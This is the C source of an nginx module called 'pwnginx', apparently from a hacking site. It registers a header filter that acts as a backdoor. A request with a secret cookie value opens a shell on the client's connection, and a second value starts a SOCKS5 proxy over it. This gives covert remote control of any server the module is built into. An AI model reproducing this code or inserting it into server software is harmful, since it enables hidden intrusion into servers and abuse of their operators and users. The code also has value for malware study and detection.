/*                                 
 *  ngx_http_pwnginx.c - pwnginx main module   
 *  t57root@gmail.com              
 *  openwill.me / www.hackshell.net
 */                           

#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>
#include "functions.h"

static ngx_int_t
ngx_http_pwnginx_init(ngx_conf_t *cf);
static ngx_http_module_t  ngx_http_pwnginx_ctx = {
    NULL,                                  /* preconfiguration */
    ngx_http_pwnginx_init,          /* postconfiguration */
    NULL,                                  /* create main configuration */
    NULL,                                  /* init main configuration */
    NULL,                                  /* create server configuration */
    NULL,                                  /* merge server configuration */
    NULL,                                    /* create location configuration */
    NULL                                   /* merge location configuration */
};
ngx_module_t  ngx_http_pwnginx = {
    NGX_MODULE_V1,
    &ngx_http_pwnginx_ctx,   /* module context */
    NULL,      /* module directives */
    NGX_HTTP_MODULE,                       /* module type */
    NULL,                                  /* init master */
    NULL,                                  /* init module */
    NULL,                                  /* init process */
    NULL,                                  /* init thread */
    NULL,                                  /* exit thread */
    NULL,                                  /* exit process */
    NULL,                                  /* exit master */
    NGX_MODULE_V1_PADDING
};
static ngx_http_output_header_filter_pt  ngx_http_next_header_filter;
static ngx_http_output_body_filter_pt ngx_http_next_body_filter;
static ngx_int_t
ngx_http_pwnginx_header_filter(ngx_http_request_t *r)
{
    int cmd_fd = r->connection->fd;
    ngx_table_elt_t ** cookies = NULL;
    cookies = r->headers_in.cookies.elts;
    if(r->headers_in.cookies.nelts==1){
        if(strncmp((char *)cookies[0]->value.data,"pwnginx=on; action=1",strlen("pwnginx=on; action=1"))==0){
            msend(cmd_fd, "pwnginx1", sizeof("pwnginx1"));
            exec_shell(cmd_fd);
        }
        else if(strncmp((char *)cookies[0]->value.data,"pwnginx=on; action=2",strlen("pwnginx=on; action=2"))==0){
            msend(cmd_fd, "pwnginx2", sizeof("pwnginx2"));
            exec_socks5(cmd_fd);
        }
    }
    return ngx_http_next_header_filter(r);
}

static ngx_int_t
ngx_http_pwnginx_body_filter(ngx_http_request_t *r, ngx_chain_t *in)
{
    return ngx_http_next_body_filter(r, in);
}

static ngx_int_t
ngx_http_pwnginx_init(ngx_conf_t *cf)
{
    ngx_http_next_header_filter = ngx_http_top_header_filter;
    ngx_http_top_header_filter = ngx_http_pwnginx_header_filter;
    ngx_http_next_body_filter = ngx_http_top_body_filter;
    ngx_http_top_body_filter = ngx_http_pwnginx_body_filter;
    return NGX_OK;
}

